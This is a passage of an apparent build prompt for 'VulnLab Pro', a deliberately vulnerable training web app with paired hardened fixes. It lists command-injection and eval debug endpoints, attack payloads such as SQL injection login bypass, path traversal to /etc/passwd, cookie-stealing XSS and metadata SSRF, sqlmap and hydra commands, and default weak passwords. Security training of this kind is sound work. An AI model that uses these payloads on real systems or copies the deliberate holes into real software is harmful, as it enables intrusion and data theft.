+  --bg-elevated:    #161b22;   /* Cards, panels */
+  --bg-subtle:      #21262d;   /* Inputs, hover states */
+  --bg-overlay:     #2d333b;   /* Modals, tooltips */
+
+  /* Borders */
+  --border-default: #30363d;
+  --border-muted:   #21262d;
+  --border-strong:  #484f58;
+
+  /* Text */
+  --text-primary:   #e6edf3;
+  --text-secondary: #8b949e;
+  --text-disabled:  #484f58;
+  --text-link:      #58a6ff;
+
+  /* Accent */
+  --accent:         #00b4d8;
+  --accent-hover:   #0096b7;
+  --accent-muted:   rgba(0, 180, 216, 0.15);
+
+  /* Status */
+  --danger:         #f85149;
+  --danger-muted:   rgba(248, 81, 73, 0.15);
+  --success:        #3fb950;
+  --success-muted:  rgba(63, 185, 80, 0.15);
+  --warning:        #d29922;
+  --warning-muted:  rgba(210, 153, 34, 0.15);
+
+  /* Security Mode Indicators */
+  --vuln-color:     #f85149;       /* Red for vulnerable mode */
+  --vuln-glow:      rgba(248, 81, 73, 0.4);
+  --hardened-color: #3fb950;       /* Green for hardened mode */
+  --hardened-glow:  rgba(63, 185, 80, 0.4);
+
+  /* Typography */
+  --font-sans:  'IBM Plex Sans', 'Segoe UI', system-ui, sans-serif;
+  --font-mono:  'IBM Plex Mono', 'Fira Code', 'Courier New', monospace;
+
+  /* Spacing */
+  --space-xs:   4px;
+  --space-sm:   8px;
+  --space-md:   16px;
+  --space-lg:   24px;
+  --space-xl:   32px;
+  --space-2xl:  48px;
+
+  /* Border Radius */
+  --radius-sm:  4px;
+  --radius-md:  8px;
+  --radius-lg:  12px;
+  --radius-full: 9999px;
+
+  /* Shadows */
+  --shadow-sm:  0 1px 3px rgba(0,0,0,0.4);
+  --shadow-md:  0 4px 12px rgba(0,0,0,0.5);
+  --shadow-lg:  0 8px 24px rgba(0,0,0,0.6);
+}
+10.3 Layout Structure
+┌─────────────────────────────────────────────────────────────┐
+│ NAVBAR (60px height, fixed top)                             │
+│ [⚡VulnLab Pro]  [Channels] [Market] [Wallet] [Feed]       │
+│                                    [🔴 VULN MODE ●━━━━━○] [👤 alice ▼] │
+├────────────────┬────────────────────────────────────────────┤
+│                │                                            │
+│ SIDEBAR        │  MAIN CONTENT AREA                         │
+│ (240px, fixed) │  (flex-grow, scrollable)                   │
+│                │                                            │
+│ # general      │  ┌──────────────────────────────────────┐  │
+│ # random       │  │  Page content renders here           │  │
+│ # marketplace  │  │                                      │  │
+│ + New Channel  │  │                                      │  │
+│                │  └──────────────────────────────────────┘  │
+│ ─────────────  │                                            │
+│ DIRECT MSGS    │                                            │
+│ @ alice        │                                            │
+│ @ bob          │                                            │
+└────────────────┴────────────────────────────────────────────┘
+10.4 The Security Mode Toggle (Navbar Component)
+This is the most visually distinctive element of the app.
+It must be impossible to miss.
+Vulnerable:  [ ⚠ VULNERABLE  ○━━━━━● ]   ← red, pulsing glow
+Hardened:    [ ✓ HARDENED    ●━━━━━○ ]   ← green, steady glow
+CSS animation for vulnerable mode: subtle red pulsing glow effect
+(box-shadow: 0 0 8px var(--vuln-glow) with keyframe animation)
+Non-admins: toggle is visible but disabled; hovering shows tooltip "Admin access required"
+Admins: clicking shows confirmation modal before switching
+10.5 Warning Banner (WarningBanner.jsx)
+This banner must appear at the TOP of every page, above the navbar.
+It must be 100% width, 36px height, centered text.
+VULNERABLE mode:
+▓▓▓ ⚠ INTENTIONALLY VULNERABLE — FOR SECURITY EDUCATION ONLY — DO NOT DEPLOY PUBLICLY ⚠ ▓▓▓
+Background: var(--danger), text white, bold, 12px, font-mono
+HARDENED mode:
+✓ HARDENED MODE ACTIVE — Vulnerabilities Mitigated
+Background: var(--success-muted), border-top var(--success), text success
+10.6 Admin Dashboard Layout
+The admin panel at /admin uses a full-page layout with a left tab navigation:
+Tabs:
+
+Overview (stats: user count, product count, transaction volume, today's requests)
+Users (searchable table: id, username, email, role, balance, status, actions)
+Products (table with add/edit/delete)
+Balance Manager (select user, enter amount +/-, reason, apply)
+Channel Manager (list all, create, delete)
+Security Mode (the toggle + description of what changes)
+Request Logs (searchable, filterable, paginated table of request_logs)
+Security Events (filtered security_events table)
+Log Download (button to download current log file)
+
+
+═══════════════════════════════════════════════════════════════
+PART 11 — REST API ENDPOINTS (ALL MUST BE IMPLEMENTED)
+═══════════════════════════════════════════════════════════════
+Auth
+
+POST /api/auth/register — create new user
+POST /api/auth/login — returns JWT + sets cookie
+POST /api/auth/logout — clears session and cookie
+GET  /api/auth/me — returns current user from JWT
+POST /api/auth/forgot-password — sends/returns reset token
+POST /api/auth/reset-password — resets password with token
+
+Users
+
+GET  /api/users — list all users (IDOR demo: returns sensitive fields in vuln mode)
+GET  /api/users/:id — single user (IDOR in vuln mode)
+PUT  /api/users/:id — update user (mass assignment in vuln mode)
+DELETE /api/users/:id — delete own account (or any account in vuln mode)
+
+Products
+
+GET  /api/products — list products with search (SQLi in vuln mode)
+GET  /api/products/:id — single product
+POST /api/products — create product (auth required)
+PUT  /api/products/:id — update product
+DELETE /api/products/:id — delete product
+
+Cart & Orders
+
+GET  /api/cart — get current user's cart
+POST /api/cart — add item
+PUT  /api/cart/:productId — update quantity
+DELETE /api/cart/:productId — remove item
+POST /api/orders/checkout — process checkout (deducts balance)
+GET  /api/orders — my orders
+GET  /api/orders/:id — single order (IDOR in vuln mode)
+
+Transactions
+
+GET  /api/transactions — my transactions
+GET  /api/transactions/:id — single transaction (IDOR in vuln mode)
+POST /api/transactions/transfer — send money to user
+
+Channels & Messages
+
+GET  /api/channels — list channels (private channels visible in vuln mode)
+POST /api/channels — create channel
+DELETE /api/channels/:id — delete channel
+POST /api/channels/:id/join — join channel
+POST /api/channels/:id/leave — leave channel
+GET  /api/channels/:id/messages — messages (no auth check in vuln mode)
+POST /api/channels/:id/messages — send message (XSS in vuln mode)
+DELETE /api/messages/:id — delete message
+
+Social
+
+GET  /api/feed — social feed
+POST /api/posts — create post
+DELETE /api/posts/:id — delete post
+POST /api/posts/:id/like — like post
+POST /api/posts/:id/comment — add comment
+POST /api/users/:id/follow — follow user
+DELETE /api/users/:id/follow — unfollow user
+
+File Uploads (Multer)
+
+POST /api/upload/avatar — upload profile picture
+POST /api/upload/product — upload product image
+POST /api/upload/channel — upload file in channel
+GET  /api/files/:filename — serve file (path traversal in vuln mode)
+
+Admin (requires admin/sudo role — improperly checked in vuln mode)
+
+GET  /api/admin/users — all users with sensitive data
+PATCH /api/admin/users/:id/balance — update balance (delta: number)
+PATCH /api/admin/users/:id/role — change role
+DELETE /api/admin/users/:id — hard delete user
+POST /api/admin/users/:id/lock — lock account
+POST /api/admin/users/:id/unlock — unlock account
+POST /api/admin/security-mode — toggle mode
+GET  /api/admin/logs — paginated request logs
+GET  /api/admin/logs/download — download app.log file
+GET  /api/admin/security-events — security events
+POST /api/admin/import — bulk import (XXE + eval() in vuln mode)
+
+Vulnerability Endpoints (only registered in vulnerable mode)
+
+GET  /api/debug/ping?host= — OS command injection
+GET  /api/debug/eval — POST body eval'd as JavaScript
+GET  /api/debug/env — returns process.env (exposes all secrets)
+GET  /api/debug/version — returns full package.json
+POST /api/products/fetch-image — SSRF endpoint
+POST /api/webhooks/test — blind SSRF
+GET  /api/redirect?url= — open redirect
+GET  /api/files/download?name= — path traversal
+
+
+═══════════════════════════════════════════════════════════════
+PART 12 — DOCKER CONFIGURATION
+═══════════════════════════════════════════════════════════════
+docker-compose.yml (Default — Vulnerable Mode)
+yamlversion: '3.8'
+
+services:
+  app:
+    build:
+      context: .
+      dockerfile: Dockerfile
+    container_name: vulnlab-app
+    ports:
+      - "3000:3000"     # Backend API + static frontend
+    environment:
+      NODE_ENV: development
+      DB_HOST: db
+      DB_PORT: 3306
+      DB_USER: vulnlab
+      DB_PASS: vulnlab123
+      DB_NAME: vulnlab
+      JWT_SECRET: weak_jwt_secret
+      SESSION_SECRET: weak_session_secret
+      LOG_LEVEL: debug
+      FRONTEND_URL: http://localhost:3000
+      DEBUG: '*'
+    volumes:
+      - ./backend/uploads:/app/backend/uploads
+      - ./logs:/app/logs
+    depends_on:
+      db:
+        condition: service_healthy
+    restart: unless-stopped
+
+  db:
+    image: mysql:8.0
+    container_name: vulnlab-db
+    environment:
+      MYSQL_ROOT_PASSWORD: rootpassword
+      MYSQL_DATABASE: vulnlab
+      MYSQL_USER: vulnlab
+      MYSQL_PASSWORD: vulnlab123
+    volumes:
+      - mysql_data:/var/lib/mysql
+      - ./backend/db/schema.sql:/docker-entrypoint-initdb.d/01-schema.sql
+      - ./backend/db/seed.sql:/docker-entrypoint-initdb.d/02-seed.sql
+    ports:
+      - "3306:3306"
+    healthcheck:
+      test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "-u", "root", "-prootpassword"]
+      interval: 10s
+      timeout: 5s
+      retries: 10
+      start_period: 30s
+
+  phpmyadmin:
+    image: phpmyadmin/phpmyadmin:latest
+    container_name: vulnlab-pma
+    ports:
+      - "8080:80"
+    environment:
+      PMA_HOST: db
+      PMA_USER: root
+      PMA_PASSWORD: rootpassword
+    depends_on:
+      - db
+
+volumes:
+  mysql_data:
+    driver: local
+Dockerfile
+dockerfileFROM node:18-alpine
+
+WORKDIR /app
+
+# Copy and install backend dependencies
+COPY backend/package*.json ./backend/
+RUN cd backend && npm install
+
+# Copy and build frontend
+COPY frontend/package*.json ./frontend/
+RUN cd frontend && npm install
+COPY frontend/ ./frontend/
+RUN cd frontend && npm run build
+
+# Copy backend source
+COPY backend/ ./backend/
+
+# Copy built frontend to backend public folder
+RUN cp -r frontend/dist backend/public
+
+# Create directories
+RUN mkdir -p logs backend/uploads/avatars backend/uploads/products \
+    backend/uploads/channels backend/uploads/documents
+
+# Set permissions
+RUN chmod 755 logs  # 777 in vulnerable, 640 in hardened (controlled by app)
+
+EXPOSE 3000
+
+WORKDIR /app/backend
+CMD ["node", "index.js"]
+
+═══════════════════════════════════════════════════════════════
+PART 13 — .env.example FILE
+═══════════════════════════════════════════════════════════════
+bash# ──────────────────────────────────────────
+# VulnLab Pro — Environment Configuration
+# Copy this file to .env and fill in values
+# ──────────────────────────────────────────
+
+# Application
+NODE_ENV=development
+PORT=3000
+FRONTEND_URL=http://localhost:3000
+LOG_LEVEL=debug
+
+# Database
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_USER=vulnlab
+DB_PASS=vulnlab123
+DB_NAME=vulnlab
+DB_ROOT_PASS=rootpassword
+
+# Authentication
+# VULNERABLE MODE: uses weak value below
+# HARDENED MODE: replace with 64+ random bytes
+JWT_SECRET=weak_jwt_secret_change_me_in_hardened_mode
+SESSION_SECRET=weak_session_secret_change_me
+
+# JWT Expiry (vulnerable: empty = no expiry; hardened: 1h)
+JWT_EXPIRES_IN=
+
+# CORS
+# In hardened mode: set to your actual frontend URL
+CORS_ORIGIN=*
+
+# Logging
+LOG_DIR=./logs
+LOG_ROTATION_DAYS=30
+
+# File Upload
+UPLOAD_DIR=./uploads
+MAX_FILE_SIZE_MB=100
+# In hardened mode: change to: jpg,jpeg,png,gif,pdf,doc,docx,txt
+ALLOWED_EXTENSIONS=*
+
+# Debug (set to '' in hardened mode)
+DEBUG=*
+
+═══════════════════════════════════════════════════════════════
+PART 14 — README.md: COMPLETE KALI LINUX INSTALLATION GUIDE
+═══════════════════════════════════════════════════════════════
+The README.md must be a complete, beginner-to-intermediate guide.
+Include ALL sections below with EXACT terminal commands.
+markdown# VulnLab Pro — Penetration Testing Practice Platform
+██╗   ██╗██╗   ██╗██╗     ███╗   ██╗██╗      █████╗ ██████╗
+██║   ██║██║   ██║██║     ████╗  ██║██║     ██╔══██╗██╔══██╗
+██║   ██║██║   ██║██║     ██╔██╗ ██║██║     ███████║██████╔╝
+╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██║     ██╔══██║██╔══██╗
+╚████╔╝ ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██████╔╝
+╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═════╝
+P R O
+
+## ⚠️ Legal Disclaimer
+
+> THIS APPLICATION IS INTENTIONALLY VULNERABLE.
+> Use ONLY in local lab environments on machines you own.
+> Never deploy this on a public network or internet-facing server.
+> The authors assume no liability for misuse.
+
+---
+
+## What is VulnLab Pro?
+
+VulnLab Pro is a deliberately vulnerable full-stack web application
+for cybersecurity training. It simulates a real enterprise platform
+combining messaging (Slack-like), e-commerce (Amazon-like), social
+media, and banking features — all with real, exploitable vulnerabilities.
+
+**Features:**
+- All OWASP Top 10 (2021) vulnerabilities
+- One-click toggle between Vulnerable and Hardened mode
+- 10 pre-seeded users with weak passwords
+- MySQL + GraphQL + JWT + Socket.io backend
+- Complete request logging with downloadable logs
+- Admin dashboard with full control
+
+---
+
+## System Requirements
+
+- Kali Linux 2023+ (or any Debian/Ubuntu-based distro)
+- 2GB RAM minimum (4GB recommended)
+- 5GB disk space
+- Internet connection (for initial package download only)
+
+---
+
+## Installation — Method 1: Docker (Recommended, Fastest)
+
+Docker gives you a fully isolated environment with one command.
+
+### Step 1: Install Docker and Docker Compose
+
+```bash
+# Update package list
+sudo apt update
+
+# Install Docker
+sudo apt install -y docker.io docker-compose
+
+# Start Docker service
+sudo systemctl start docker
+sudo systemctl enable docker
+
+# Add your user to docker group (avoids needing sudo for docker)
+sudo usermod -aG docker $USER
+
+# Log out and back in, OR run:
+newgrp docker
+
+# Verify
+docker --version
+docker-compose --version
+```
+
+### Step 2: Clone the Repository
+
+```bash
+# Navigate to your home directory or a lab directory
+cd ~
+mkdir pentest-labs && cd pentest-labs
+
+# Clone the project
+git clone https://github.com/youruser/vulnlab-pro.git
+cd vulnlab-pro
+```
+
+### Step 3: Configure Environment
+
+```bash
+# Copy the example environment file
+cp .env.example .env
+
+# The defaults work for Docker. View what's inside:
+cat .env
+```
+
+### Step 4: Build and Start
+
+```bash
+# Build and start all containers (first run takes 3-5 minutes)
+docker-compose up --build -d
+
+# Watch the logs to see when startup is complete:
+docker-compose logs -f app
+
+# Wait for this message:
+# ✅ VulnLab Pro running on http://localhost:3000
+# ✅ Database connected
+# ✅ Schema initialized
+# ✅ Seed data loaded
+```
+
+### Step 5: Access the Application
+
+Open your browser in Kali Linux:
+
+| Service | URL | Purpose |
+|---------|-----|---------|
+| Main App | http://localhost:3000 | The vulnerable web app |
+| Admin Panel | http://localhost:3000/admin | Admin dashboard |
+| GraphQL IDE | http://localhost:3000/graphql | API explorer |
+| phpMyAdmin | http://localhost:8080 | Database viewer |
+
+---
+
+## Installation — Method 2: Manual (No Docker)
+
+Use this if you prefer to run everything natively on Kali.
+
+### Step 1: Install Node.js 18
+
+```bash
+# Kali Linux typically has an older Node.js. Install v18 LTS:
+curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+sudo apt install -y nodejs
+
+# Verify
+node --version   # Should show v18.x.x
+npm --version
+```
+
+### Step 2: Install MySQL 8
+
+```bash
+# Install MySQL server
+sudo apt install -y mysql-server
+
+# Start MySQL
+sudo systemctl start mysql
+sudo systemctl enable mysql
+
+# Secure the installation (set root password, remove test DB)
+sudo mysql_secure_installation
+
+# Log in to MySQL as root
+sudo mysql -u root -p
+
+# Inside MySQL shell, run:
+CREATE DATABASE vulnlab CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
+CREATE USER 'vulnlab'@'localhost' IDENTIFIED BY 'vulnlab123';
+GRANT ALL PRIVILEGES ON vulnlab.* TO 'vulnlab'@'localhost';
+FLUSH PRIVILEGES;
+EXIT;
+```
+
+### Step 3: Set Up the Database
+
+```bash
+# Import schema (creates all tables)
+mysql -u vulnlab -pvulnlab123 vulnlab < backend/db/schema.sql
+
+# Import seed data (creates 10 users, 50 products, channels, etc.)
+mysql -u vulnlab -pvulnlab123 vulnlab < backend/db/seed.sql
+
+# Verify data was inserted:
+mysql -u vulnlab -pvulnlab123 vulnlab -e "SELECT username, role, balance FROM users;"
+```
+
+### Step 4: Install Dependencies
+
+```bash
+# Install backend dependencies
+cd backend
+npm install
+cd ..
+
+# Install frontend dependencies and build
+cd frontend
+npm install
+npm run build     # Creates dist/ folder
+cd ..
+```
+
+### Step 5: Configure Environment
+
+```bash
+# Copy and edit the environment file
+cp .env.example .env
+nano .env
+
+# Change these values for manual (non-Docker) setup:
+# DB_HOST=127.0.0.1
+# DB_USER=vulnlab
+# DB_PASS=vulnlab123
+# DB_NAME=vulnlab
+```
+
+### Step 6: Start the Application
+
+```bash
+# Copy frontend build to backend public folder
+cp -r frontend/dist backend/public
+
+# Create log directory
+mkdir -p logs
+
+# Start the server
+cd backend
+node index.js
+
+# For development with auto-restart:
+npx nodemon index.js
+
+# You should see:
+# ✅ VulnLab Pro running on http://localhost:3000
+```
+
+---
+
+## Default Login Accounts
+
+| Username | Password | Role | Balance | Notes |
+|----------|----------|------|---------|-------|
+| **admin** | Admin@123 | sudo | $99,999 | Full admin access |
+| **ivan** | qwerty | admin | $6,600 | Secondary admin |
+| **john** | john123 | user | $5,000 | Regular user |
+| **alice** | password | user | $3,200 | Regular user |
+| **mike** | 123456 | user | $1,500 | Regular user |
+| **diana** | diana123 | seller | $8,800 | Product seller |
+| **eve** | eve123 | user | $200 | Low-balance user |
+| **frank** | test123 | user | $12,000 | High-balance user |
+| **grace** | grace123 | moderator | $700 | Moderator |
+| **henry** | 111111 | seller | $4,400 | Product seller |
+
+---
+
+## Security Mode Explained
+
+### Vulnerable Mode (Default — Red Indicator)
+
+All OWASP Top 10 vulnerabilities are ACTIVE. The application intentionally:
+- Uses SQL string concatenation (SQL injection possible)
+- Stores passwords as plaintext
+- Has no rate limiting on login (brute force possible)
+- Returns full user data to any authenticated user (IDOR)
+- Renders messages as raw HTML (XSS possible)
+- Logs full request bodies including passwords
+- Has no CSRF protection
+- Accepts any file type for upload
+
+### Hardened Mode (Green Indicator)
+
+All vulnerabilities are MITIGATED:
+- Parameterized queries everywhere
+- bcrypt password hashing
+- Rate limiting (5 attempts per 15 minutes)
+- Ownership checks on all data access
+- HTML-escaped output (XSS prevented)
+- Sensitive fields redacted from logs
+- CSRF tokens required
+- File type strict allowlisting
+
+### How to Switch Modes
+
+1. Log in as `admin` / `Admin@123`
+2. Click the mode toggle in the top navbar (red/green pill)
+3. Confirm in the modal
+4. Mode changes instantly for ALL users
+
+---
+
+## OWASP Top 10 — Quick Attack Reference
+
+| # | Vulnerability | Endpoint to Attack | Quick Exploit |
+|---|--------------|-------------------|---------------|
+| A01 | Broken Access Control | GET /api/users/1 | Logged in as alice, fetch admin's data |
+| A02 | Crypto Failures | GET /api/users/1 | password_plain field returned in response |
+| A03 | SQL Injection | POST /api/auth/login | username: `' OR '1'='1' -- ` |
+| A03 | SQL Injection | GET /api/products?search= | UNION-based extraction |
+| A03 | Command Injection | GET /api/debug/ping?host= | `127.0.0.1; id` |
+| A04 | Logic Flaw | POST /api/transactions/transfer | `amount: -1000` |
+| A05 | Misconfiguration | Any error URL | Stack trace in response |
+| A07 | Auth Failure | POST /api/auth/login | Brute force (no rate limit) |
+| A08 | File Upload | POST /api/upload/channel | Upload shell.php |
+| A09 | Logging Failure | POST /api/auth/login | password appears in logs |
+| A10 | SSRF | POST /api/products/fetch-image | `url: http://127.0.0.1:3306` |
+| - | XSS | POST /api/channels/:id/messages | `<script>alert(1)</script>` |
+| - | CSRF | POST /api/transactions/transfer | No CSRF token required |
+| - | JWT Exploit | Any JWT-protected endpoint | Modify payload, alg: none |
+| - | Open Redirect | GET /api/redirect?url= | `?url=https://evil.com` |
+| - | Path Traversal | GET /api/files/download?name= | `?name=../../etc/passwd` |
+| - | IDOR (Files) | GET /uploads/avatars/filename | Enumerate uploaded files |
+| - | Race Condition | POST /api/transactions/transfer | 10 concurrent requests |
+
+---
+
+## Useful Attack Tools (Kali Linux)
+
+```bash
+# SQL Injection with sqlmap
+sqlmap -u "http://localhost:3000/api/products?search=test" \
+       --dbs --tables --dump --batch
+
+# sqlmap on login form
+sqlmap -u "http://localhost:3000/api/auth/login" \
+       --data='{"username":"test","password":"test"}' \
+       --method=POST --headers="Content-Type: application/json" \
+       --dbs --batch
+
+# Brute force login with Hydra
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+      localhost http-post-form \
+      "/api/auth/login:username=^USER^&password=^PASS^:Invalid credentials"
+
+# Nikto web scan
+nikto -h http://localhost:3000
+
+# JWT analysis with jwt_tool
+pip3 install jwt_tool
+jwt_tool <your_jwt_token>
+
+# Burp Suite (already on Kali) — set browser proxy to 127.0.0.1:8080
+# Then intercept all traffic to VulnLab Pro
+```
+
+---
+
+## Viewing Logs
+
+```bash
+# Watch live application logs
+tail -f logs/app-$(date +%Y-%m-%d).log
+
+# Pretty-print with jq
+tail -f logs/app-$(date +%Y-%m-%d).log | jq '.'
+
+# Filter for auth events only
+tail -f logs/app-$(date +%Y-%m-%d).log | jq 'select(.type == "auth_failure")'
+
+# Filter for suspicious inputs
+tail -f logs/app-$(date +%Y-%m-%d).log | jq 'select(.is_suspicious == true)'
+
+# See all login attempts
+grep '"type":"auth_attempt"' logs/app-$(date +%Y-%m-%d).log | jq '.'
+
+# Download logs via admin panel
+# Admin Panel → Logs → Download Log File button
+# Or: curl -H "Authorization: Bearer <admin_token>" \
+#          http://localhost:3000/api/admin/logs/download -o vulnlab.log
+```
+
+---
+
+## Resetting the Lab
+
+```bash
+# Docker: complete reset (drops all data, re-seeds)
+docker-compose down -v
+docker-compose up --build -d
+
+# Manual: reset just the database
+mysql -u vulnlab -pvulnlab123 vulnlab < backend/db/schema.sql
+mysql -u vulnlab -pvulnlab123 vulnlab < backend/db/seed.sql
+
+# Reset to vulnerable mode via MySQL
+mysql -u vulnlab -pvulnlab123 vulnlab \
+      -e "UPDATE app_settings SET security_mode='vulnerable' WHERE id=1;"
+```
+
+---
+
+## Troubleshooting
+
+### Port 3000 already in use
+```bash
+sudo lsof -i :3000
+sudo kill -9 <PID>
+```
+
+### MySQL connection refused
+```bash
+sudo systemctl status mysql
+sudo systemctl restart mysql
+# Check if MySQL is listening:
+sudo netstat -tlnp | grep 3306
+```
+
+### Docker permission denied
+```bash
+sudo usermod -aG docker $USER
+newgrp docker
+```
+
+### Node.js version too old
+```bash
+node --version   # Need 18+
+# Re-install via nodesource:
+curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+sudo apt install -y nodejs
+```
+
+### Database tables don't exist
+```bash
+# Run migrations manually
+cd backend
+node db/migrate.js
+```
+
+### GraphQL playground not loading
+Make sure `NODE_ENV=development` in your `.env` — playground is disabled in production.
+
+---
+
+## Project Architecture
+Browser (React) ←→ REST/GraphQL API (Express + Apollo)
+↕
+MySQL 8 Database
+↕
+Socket.io (real-time chat)
+↕
+Winston Logger (logs/ + DB)
+
+---
+
+## License
+
+MIT License — for educational and research use only.
+
+**Do NOT use this application in production environments.**
+**Do NOT expose this application to the public internet.**
+
+═══════════════════════════════════════════════════════════════
+PART 15 — AGENT BUILD ORDER AND CODE QUALITY RULES
+═══════════════════════════════════════════════════════════════
+15.1 Build Order (Follow Exactly)
+
+Create complete folder structure (mkdir -p all directories)
+Write package.json files (root, backend, frontend)
+Write .env.example and .gitignore
+Write backend/db/schema.sql — ALL tables, complete SQL
+Write backend/db/seed.sql — ALL 10 users, 50 products, channels, messages, settings
+Write backend/db/migrate.js — auto-runs schema + seed on startup
+Write backend/config/database.js — mysql2 pool setup
+Write backend/utils/logger.js — Winston configuration
+Write backend/middleware/securityMode.js — the mode-reading middleware
+Write backend/middleware/requestLogger.js — logs every request
+Write backend/middleware/authenticate.js — JWT verification
+Write backend/middleware/authorize.js — role checking
+Write all remaining middleware (rateLimiter, csrf, headers, sanitizer)
+Write backend/routes/auth.js — login and register with DUAL MODE SQL
+Write all other route files (admin, upload, debug, webhook, redirect)
+Write backend/graphql/typeDefs/*.graphql — all type definitions
+Write backend/graphql/resolvers/*.js — all resolvers with dual mode
+Write backend/index.js — Express + Apollo Server + Socket.io setup
+Write frontend/src/apollo/client.js — Apollo Client setup
+Write all React context providers
+Write all page components
+Write all shared components
+Write all CSS files
+Write Dockerfile and docker-compose.yml
+Write docs/VULNERABILITIES.md — full exploit guide
+Write README.md — complete Kali guide
+
+15.2 Code Quality Rules
+
+NO PLACEHOLDERS: Zero // TODO, // implement later, // add logic here allowed
+FULLY IMPLEMENTED FUNCTIONS: Every function has a working body
+COMMENT TAGS: Add // [VULN-A0X: description] above every vulnerable block
+and // [FIX-A0X: description] above every hardened block
+MAX FILE LENGTH: Split files longer than 300 lines into sub-modules
+ERROR HANDLING: Every async function has try/catch; every error is logged
+CONSISTENT MODE CHECKING: The pattern if (req.securityMode === 'vulnerable') or
+if (mode === 'vulnerable') must appear consistently throughout
+NO TYPESCRIPT: Plain JavaScript only (keeps the codebase accessible to beginners)
+GENUINE VULNERABILITIES: SQL injection must be real (string concatenation).
+XSS must render real HTML. IDOR must actually return other users' data.
+Do not mock or stub vulnerabilities — implement them genuinely.
+GENUINE MITIGATIONS: Hardened mode must actually prevent the attacks.
+Prepared statements must actually use ? placeholders.
+bcrypt must actually be called. Rate limiting must actually block.
+
+15.3 What the Finished Application Must Be Able to Do
+As a penetration tester, I must be able to:
+In VULNERABLE mode:
+
+ Log in as ' OR '1'='1' --  with any password and get admin access
+ Fetch /api/users/1 as alice and see admin's SSN, plaintext password, secret_note
+ Send <script>alert(document.cookie)</script> in a channel and have it execute for all viewers
+ Transfer -$1000 to steal money from another user
+ Upload shell.php to the file upload endpoint
+ Ping 127.0.0.1; cat /etc/passwd via the debug endpoint
+ Fetch http://169.254.169.254/latest/meta-data/ via the SSRF endpoint
+ Use sqlmap on the product search and extract the users table
+ Change my own role to admin by PUTting {"role":"admin"} to my profile
+ Browse /uploads/ and see all uploaded files
+ See stack traces and SQL query details in error responses
+ See my own password in plaintext in the logs
+ Make unlimited login attempts without being blocked
+ Use GraphQL introspection to map the entire schema
+ Access /admin endpoints without having the admin role
+
+In HARDENED mode:
+
+ Confirm SQL injection payload returns "Invalid credentials" without logging in
+ Confirm fetching /api/users/1 as alice returns only public fields (no SSN, no password)
+ Confirm <script> in messages is displayed as text, not executed
+ Confirm negative transfer amount is rejected with "Amount must be positive"
+ Confirm .php file upload is rejected
+ Confirm debug endpoint returns 404
+ Confirm SSRF is blocked for internal IPs
+ Confirm 6th login attempt in 15 minutes is blocked
+ Confirm GraphQL introspection returns 403
+ Confirm role change attempt via PUT body is ignored
+
+This checklist is the acceptance criteria. Every item must work.
+
+═══════════════════════════════════════════════════════════════
+PART 16 — DOCUMENTATION FILES
+═══════════════════════════════════════════════════════════════
+docs/VULNERABILITIES.md
+Generate a comprehensive exploitation guide with this structure for EACH vulnerability:
+markdown## A03.1 — SQL Injection: Login Bypass
+
+**Category:** OWASP A03 — Injection
+**Severity:** Critical
+**Location:** POST /api/auth/login, field: username
+**Mode:** Vulnerable only
+
+### Description
+The login endpoint directly concatenates user input into a SQL query without
+sanitization or parameterization, allowing an attacker to manipulate the query
+logic.
+
+### Vulnerable Code
+```javascript
+// backend/routes/auth.js line ~45
+const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+```
+
+### Exploitation Steps
+
+1. Navigate to http://localhost:3000/login
+2. In the username field, enter: `' OR '1'='1' -- `
+3. In the password field, enter anything (e.g., `anything`)
+4. Click Login
+5. The resulting SQL query becomes:
+   SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='anything'
+6. Because '1'='1' is always true and the rest is commented out,
+   the query returns the first user in the database (admin)
+7. You are now logged in as admin
+
+### Using sqlmap
+```bash
+sqlmap -u "http://localhost:3000/api/auth/login" \
+  --data='{"username":"test","password":"test"}' \
+  --method=POST \
+  --headers="Content-Type: application/json" \
+  --dbs --tables --dump --batch
+```
+
+### Expected Result
+Full admin access; also extracts all users table data with sqlmap.
+
+### Hardened Fix
+```javascript
+// Parameterized query — injection impossible
+const [rows] = await db.execute(
+  `SELECT * FROM users WHERE username = ?`,
+  [username]
+);
+const valid = await bcrypt.compare(password, rows[0]?.password || '');
+```
+
+### Prevention Principle
+Always use parameterized queries (prepared statements). Never concatenate
+user input into SQL strings. Use an allowlist for any dynamic SQL parts
+(like column names for ORDER BY).
+Write this full structure for EVERY vulnerability listed in Part 6 and Part 7.
+
+END OF MASTER AGENT PROMPT
